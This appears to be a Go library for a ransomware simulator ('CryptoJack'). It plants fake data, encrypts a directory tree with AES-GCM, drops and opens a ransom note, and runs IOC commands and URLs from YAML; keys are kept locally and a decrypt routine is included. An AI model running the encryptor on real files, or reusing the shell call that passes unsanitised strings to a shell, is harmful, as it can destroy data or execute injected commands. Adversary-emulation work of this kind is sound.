package cjlib

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/json"
	"errors"
    "os/exec"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
    "net/http"
	"os"
	"path"
	"path/filepath"
	"runtime"
	"strings"
    "sync"
	"time"
	crand "crypto/rand"
    "gopkg.in/yaml.v2"
	"github.com/360EntSecGroup-Skylar/excelize"
	"github.com/brianvoe/gofakeit"
	"github.com/jung-kurt/gofpdf"
)

const RANSOM_NOTE_FILE = "__RansomNote__.html"
const RANSOM_KEY_FILE = "__RansomKey__.txt"
const HASHDB_FILE = ".CryptoJack.Hashes.db"
const UNIX_PRIVKEY_FILE = ".CryptoJack.rsaPrivKey"
const UNIX_ENCKEY_FILE = ".CryptoJack.aesEncKey"
const NFILE_MAX = 20
const NDIR_MAX = 30
const EICAR = `X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`

var WORDLIST []string = strings.Split(WORDS, "\n")
var IOCS = make(map[string][]string)
type ioc struct {
    Data string `yaml:"data"`
    Ioc_type string `yaml:"ioc_type"`
    Note string `yaml:"note"`
}

func ReadYamlIOC(filename string) error {
    var yamliocs []ioc
    b, err := ioutil.ReadFile(filename)
    if err != nil { return err }
    if strings.HasSuffix(filename, ".enc") {
        key := []byte { 0xde, 0xad, 0xbe, 0xef }
        b = xorstr([]byte(b), key)
        fmt.Println(string(b))
    }
    if err := yaml.Unmarshal([]byte(b), &yamliocs); err != nil { return err }
    for _, i := range yamliocs {
        IOCS[i.Ioc_type] = append(IOCS[i.Ioc_type], i.Data)
    }
    return nil
}

func xorstr(buf []byte, k []byte) []byte {
    res := make([]byte, len(buf))
    for i := 0; i < len(buf); i++ {
        res[i] = buf[i] ^ k[i % len(k)]
    }
    return res
}

func Request_IOC_Commands() {
    wg := sync.WaitGroup{}
    ch := make(chan string)
    wg.Add(len(IOCS["command"]))
    for _, c := range IOCS["command"] {
        go OSCmd(c, ch, &wg)
    }
    go func() {
        wg.Wait()
        close(ch)
    }()
    n := 0
    for m := range(ch) {
        fmt.Printf("[+] %03d: %s\n", n, m)
        n += 1
    }
}

func Request_IOC_HTTP() {
    wg := sync.WaitGroup{}
    ch := make(chan string)
    wg.Add(len(IOCS["url"]))
    fmt.Printf("[*] Sending %d HTTP Requests\n", len(IOCS["url"]))
    for _, u := range IOCS["url"] {
        go HTTPRequest(u, ch, &wg)
    }
    go func() {
        wg.Wait()
        close(ch)
    }()
    n := 0
    for m := range(ch) {
        fmt.Printf("[+] %03d: %s\n", n, m)
        n += 1
    }
}

func OSCmd(cmd string, ch chan<-string, wg *sync.WaitGroup) {
    defer wg.Done()
    command := fmt.Sprintf("echo %s", cmd)

    shell := ""
    arg1 := ""
    switch runtime.GOOS {
    case "windows":
        shell = "cmd.exe"
        arg1 = "/c"
    default:
        shell = "/bin/sh"
        arg1 = "-c"
    }
    out, err := exec.Command(shell, arg1, command).CombinedOutput()
    if err == nil {
        ch <- fmt.Sprintf("%s %s %s: %d bytes returned.\n",shell, arg1, command, len(out))
    } else {
        ch <- fmt.Sprintf("Command [%s] failed to execute, error [%s]\n", command, err.Error())
    }
}

func HTTPRequest(url string, ch chan<-string, wg *sync.WaitGroup) {
    defer wg.Done()
    resp, err := http.Get(url)
    if err != nil {
        ch <- fmt.Sprintf("HTTP Response => %s", err.Error())
        return
    }
    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        ch <- fmt.Sprintf("HTTP Response => %s", err.Error())
        return
    }
    ch <- fmt.Sprintf("HTTP Response => %s: %d bytes received.", url, len(body))
}

func DisplayWebPage(url string) error {
    var cmd string
    var args []string

    switch runtime.GOOS {
    case "windows":
        cmd = "cmd"
        args = []string{"/c"}
    case "darwin":
        cmd = "open"
    default:
        cmd = "xdg-open"
    }
    args = append(args, url)
    return exec.Command(cmd, args...).Start()
}

func EncryptDirectoryStructure(
	startdir string, aeskey [32]byte, exclude string,
	newext string, norename bool, dryrun bool) (int, int, int, error) {

	if len(startdir) == 0 {
		return 0, 0, 0, errors.New("You must provide a starting directory")
	} else if len(aeskey) == 0 {
		return 0, 0, 0, errors.New("You must provide an encryption key")
	} else if len(newext) == 0 && !norename {
		return 0, 0, 0, errors.New("You must provide a new file extension for encrypted files")
	} else if _, err := os.Stat(path.Join(startdir, RANSOM_KEY_FILE)); err == nil {
		return 0, 0, 0, errors.New("This directory structure is already encrypted! I don't think you meant to do this...")
    }

	// set up starting dir
	startdir, _ = filepath.Abs(startdir)
	if _, err := os.Stat(startdir); err != nil {
		return 0, 0, 0, err
	}

    // open hash DB
    dbh := CreateAndConnectDB(path.Join(startdir, HASHDB_FILE))
    defer dbh.Close()

	var files []string
	var totalfiles int = 0
	var encrypted int = 0
	var skipped int = 0

	err := filepath.Walk(startdir, visitFilePath(&files, &skipped, exclude))
	if err != nil {
		return 0, 0, 0, err
	}

	// main loop for encrypting files
	for _, file := range files {
		if dryrun {
			fmt.Printf("[+] Dry-Run %d/%d: %s\n", totalfiles, len(files), file)
		} else {
			data, err := ioutil.ReadFile(file)
            sha256hash := sha256.Sum256(data)
			if err != nil {
				skipped++
				continue
			}
			encData, err := encryptData(data, &aeskey)
			if err != nil {
				skipped++
				continue
			}
			err = ioutil.WriteFile(file, encData, 0644)
			if err != nil {
				skipped++
				continue
			}
			encrypted++
			log.Println(fmt.Sprintf("ENCRYPTED %d/%d: %s", totalfiles+1, len(files), file))
            InsertFilePathHash(dbh, file, fmt.Sprintf("%x", sha256hash))
			// rename file to include NEW file extension
			if !norename {
				os.Rename(file, file+newext)
			}
		}
		totalfiles++
	}

	if !dryrun {
		fmt.Printf("\n[*] %d files encrypted. %d files skipped.\n", totalfiles, skipped)
		writeRansomNote(startdir, RansomNote01)
		writeRansomKeyFile(startdir, aeskey)
	} else {
		fmt.Printf("\n[*] %d eligible files. %d files skipped.\n", totalfiles, skipped)
	}
	return totalfiles, encrypted, skipped, nil
}

func DecryptDirectoryStructure(startdir string, ext string, norename bool, dryrun bool) (int, int, int, error) {
	// setup starting dir
	if len(startdir) == 0 {
		return 0, 0, 0, errors.New("You must provide a starting directory")
	}
	startdir, _ = filepath.Abs(startdir)
	if _, err := os.Stat(startdir); err != nil {
		return 0, 0, 0, err
	}

	var files []string
	var totalfiles int = 0
	var decrypted int = 0
	var skipped int = 0

    dbh := ConnectDB(path.Join(startdir, HASHDB_FILE))
	aesKey := fetchDecryptKey(startdir)
	err := filepath.Walk(startdir, visitFilePath(&files, &skipped, ""))
	if err != nil {
		return 0, 0, 0, err
	}

	// main loop for encrypting files
	for _, file := range files {
		if dryrun {
			fmt.Printf("[+] Dry-Run %d/%d: %s\n", totalfiles, len(files), file)
		} else {
			data, err := ioutil.ReadFile(file)
			if err != nil {
				log.Println(file + ":" + err.Error())
				skipped++
				continue
			}
			decData, err := decryptData(data, &aesKey)
			if err != nil {
				log.Println(file + ":" + err.Error())
				skipped++
				continue
			}
			err = ioutil.WriteFile(file, decData, 0644)
			if err != nil {
				log.Println(file + ":" + err.Error())
				skipped++
				continue
			}

            sha256hash1 := fmt.Sprintf("%x", sha256.Sum256(decData))
            sha256hash2 := GetFilePathHash(dbh, file[:len(file)-len(filepath.Ext(file))])
            result := ""
            if len(sha256hash2) == 0 {
                result = "Hash Not Found"
            } else if sha256hash1 == sha256hash2 {
                result = "OK"
            } else if sha256hash1 != sha256hash2 {
                result = "Hash Mismatch"
            }

			decrypted++
			log.Println(fmt.Sprintf("DECRYPTED %d/%d: %s (%s)", totalfiles+1, len(files), file, result))
			if !norename && filepath.Ext(file) == ext {
				os.Rename(file, file[:len(file)-len(filepath.Ext(file))])
			}
		}
		totalfiles++
	}

	if !dryrun {
		fmt.Printf("\n[*] %d files decrypted. %d files skipped.\n", totalfiles, skipped)
		fmt.Println("[*] Removing Ransom File Artifacts")
        dbh.Close()
		removeFileArtifacts(startdir)
	} else {
		fmt.Printf("\n[*] %d eligible files. %d files skipped.\n", totalfiles, skipped)
	}
	return totalfiles, decrypted, skipped, nil
}

func FakeData(directory string, depth int, msg chan string) {
	dirs, files := createDirectoryStructure(directory, depth)
	msg <- fmt.Sprintf("Created %d fake directories and %d files in [%s]!", dirs, files, directory)
}

func createDirectoryStructure(directory string, depth int) (int, int) {
	log.Printf("Fake Data Creation: [%s]", directory)
	var dirs int = 0
	files := createSampleFiles(directory)
	if depth == 0 {
		return dirs, files
	}
	depth--
	for i := 0; i < rand.Intn(NDIR_MAX); i++ {
		dirname, _ := filepath.Abs(path.Join(directory, strings.Title(RandomWord())))
		err := os.Mkdir(dirname, 0755)
		if err != nil {
			return dirs, files
		}
		dirs++
		d, f := createDirectoryStructure(dirname, depth)
		dirs += d
		files += f
	}
	return dirs, files
}

func RandomWord() string {
	return WORDLIST[rand.Int()%len(WORDLIST)]
}

func NewEncryptionKey() [32]byte {
	key := [32]byte{}
	_, err := io.ReadFull(crand.Reader, key[:])
	if err != nil {
		panic(err)
	}
	return key
}

func randomFileName(ext string) string {
	return strings.Title(RandomWord()) + strings.Title(RandomWord()) + ext
}

func visitFilePath(files *[]string, skipcount *int, exclude string) filepath.WalkFunc {
	return func(path string, info os.FileInfo, err error) error {
		if err != nil {
			log.Println(err)
			return nil
		} else if info.IsDir() {
			return nil
		} else if info.Mode().Perm()&(1<<(7)) == 0 {
			return nil
		} else if exclude_file(path, exclude) {
			*skipcount++
			return nil
		}
		*files = append(*files, path)
		return nil
	}
}

func createSampleFiles(directory string) int {
	n := rand.Intn(NFILE_MAX)
	for i := 0; i < n; i++ {
		createExcelFile(directory)
		createPDFFile(directory)
	}
	return n * 2
}

func createExcelFile(directory string) error {
	f := excelize.NewFile()
	f.SetCellValue("Sheet1", "A1", "WARNING: FAKE DATA AHEAD!!!!!")
	for i := 2; i < rand.Intn(NFILE_MAX*10); i++ {
		cell := fmt.Sprintf("A%d", i)
		data := RandomWord()
		switch i % 6 {
		case 0:
			data = gofakeit.Name()
		case 1:
			data = gofakeit.Email()
		case 2:
			data = gofakeit.Phone()
		case 3:
			data = gofakeit.JobTitle()
		case 4:
			data = gofakeit.HackerPhrase()
		case 5:
			data = fmt.Sprintf("%s", gofakeit.CreditCardNumber())
		}
		f.SetCellValue("Sheet1", cell, data)
	}
	filename := path.Join(directory, randomFileName(".xlsx"))
	if err := f.SaveAs(filename); err != nil {
		return err
	}
	return nil
}

func createPDFFile(directory string) error {
	pdf := gofpdf.New("P", "mm", "A4", "")
	pdf.AddPage()
	pdf.SetFont("Arial", "B", 16)
	height := float64(10)
	data := RandomWord() + "\n"
	for i := 0; i < rand.Intn(NFILE_MAX*10); i++ {
		switch i % 6 {
		case 0:
			data = gofakeit.Name()
		case 1:
			data = gofakeit.Email()
		case 2:
			data = gofakeit.Phone()
		case 3:
			data = gofakeit.JobTitle()
		case 4:
			data = gofakeit.HackerPhrase()
		case 5:
			data = fmt.Sprintf("%s", gofakeit.CreditCardNumber())
		}
		pdf.Cell(1, height, data)
		height += float64(30)
	}
	//pdf.Cell(300, height, data)
	filename := path.Join(directory, randomFileName(".pdf"))
	return pdf.OutputFileAndClose(filename)
}

func encryptData(plaintext []byte, key *[32]byte) (ciphertext []byte, err error) {
	block, err := aes.NewCipher(key[:])
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(crand.Reader, nonce)
	if err != nil {
		return nil, err
	}

	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

func decryptData(cipherText []byte, key *[32]byte) ([]byte, error) {
	block, err := aes.NewCipher(key[:])
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	if len(cipherText) < gcm.NonceSize() {
		return nil, errors.New("Nonce size error, file not encrypted?")
	}
	plainText, err := gcm.Open(nil, cipherText[:gcm.NonceSize()], cipherText[gcm.NonceSize():], nil)
	if err != nil {
		return nil, err
	}
	return plainText, nil
}

func exclude_file(pathname string, exclude string) bool {
	if strings.Contains(pathname, RANSOM_NOTE_FILE) {
		return true
	} else if strings.Contains(pathname, RANSOM_KEY_FILE) {
		return true
	} else if strings.Contains(pathname, HASHDB_FILE) {
		return true
	} else if strings.Contains(pathname, UNIX_PRIVKEY_FILE) {
		return true
	} else if strings.Contains(pathname, UNIX_ENCKEY_FILE) {
		return true
	} else if len(exclude) == 0 {
		return false
	}
	for _, e := range strings.Split(strings.ToLower(exclude), ",") {
		m, _ := path.Match("*"+strings.TrimSpace(e), pathname)
		if m {
			return true
		}
	}
	return false
}

func removeFileArtifacts(rootDir string) {
	os.Remove(path.Join(rootDir, RANSOM_KEY_FILE))
	os.Remove(path.Join(rootDir, RANSOM_NOTE_FILE))
    os.Remove(path.Join(rootDir, HASHDB_FILE))
	if runtime.GOOS != "windows" {
		os.Remove(path.Join(rootDir, UNIX_PRIVKEY_FILE))
		os.Remove(path.Join(rootDir, UNIX_ENCKEY_FILE))
	}
}

func writeRansomNote(rootDir string, text string) {
	ransomNoteFile, _ := filepath.Abs(path.Join(rootDir, RANSOM_NOTE_FILE))
	fmt.Printf("[*] Writing ransom note file: %s\n", ransomNoteFile)
    finalnote := fmt.Sprintf(text, rootDir)
	ioutil.WriteFile(ransomNoteFile, []byte(finalnote), 0644)
    DisplayWebPage(ransomNoteFile)
}

func writeRansomKeyFile(rootDir string, aesKey [32]byte) {
	ransomKeyFile, _ := filepath.Abs(path.Join(rootDir, RANSOM_KEY_FILE))

	// encrypt the AES key with 2048 RSA
	privKey, err := rsa.GenerateKey(crand.Reader, 2048)
	if err != nil {
		panic(err)
	}
	encAesKey, err := rsa.EncryptOAEP(sha256.New(), crand.Reader, &privKey.PublicKey, aesKey[:], nil)
	if err != nil {
		log.Fatal(err)
	}

	for {
		if _, err := os.Stat(ransomKeyFile); os.IsNotExist(err) {
			fmt.Printf("[*] Writing key file: %s\n", ransomKeyFile)
			jpubKey, _ := json.Marshal(privKey.PublicKey)
			jprivKey, _ := json.Marshal(privKey)
			jencKey, _ := json.Marshal(encAesKey)
			ioutil.WriteFile(ransomKeyFile, jpubKey, 0644)
			if runtime.GOOS == "windows" {
				ioutil.WriteFile(ransomKeyFile+":rsaPrivKey", jprivKey, 0644)
				ioutil.WriteFile(ransomKeyFile+":aesEncKey", jencKey, 0644)
			} else {
				ioutil.WriteFile(path.Join(rootDir, UNIX_PRIVKEY_FILE), jprivKey, 0644)
				ioutil.WriteFile(path.Join(rootDir, UNIX_ENCKEY_FILE), jencKey, 0644)
			}
			break
		}
		fmt.Println("[-] Key file write failed. Retrying in 5 seconds..")
		time.Sleep(5 * time.Second)
	}
}

func fetchDecryptKey(rootDir string) [32]byte {
	var pubKey, privKey rsa.PrivateKey
	var encKey []byte
	var aesKey [32]byte
	pubKeyFile := path.Join(rootDir, RANSOM_KEY_FILE)
	privKeyFile := path.Join(rootDir, RANSOM_KEY_FILE+":rsaPrivKey")
	encKeyFile := path.Join(rootDir, RANSOM_KEY_FILE+":aesEncKey")
	if runtime.GOOS != "windows" {
		privKeyFile = path.Join(rootDir, UNIX_PRIVKEY_FILE)
		encKeyFile = path.Join(rootDir, UNIX_ENCKEY_FILE)
	}
	data, err := ioutil.ReadFile(pubKeyFile)
	if err != nil {
		panic(err.Error())
	}
	json.Unmarshal(data, &pubKey)
	data, err = ioutil.ReadFile(privKeyFile)
	if err != nil {
		panic(err.Error())
	}
	json.Unmarshal(data, &privKey)

	data, err = ioutil.ReadFile(encKeyFile)
	if err != nil {
		panic(err.Error())
	}
	json.Unmarshal(data, &encKey)

	tKey, err := rsa.DecryptOAEP(sha256.New(), crand.Reader, &privKey, encKey, nil)
	if err != nil {
		panic(err.Error())
	}
	copy(aesKey[:], tKey)
	return aesKey
}
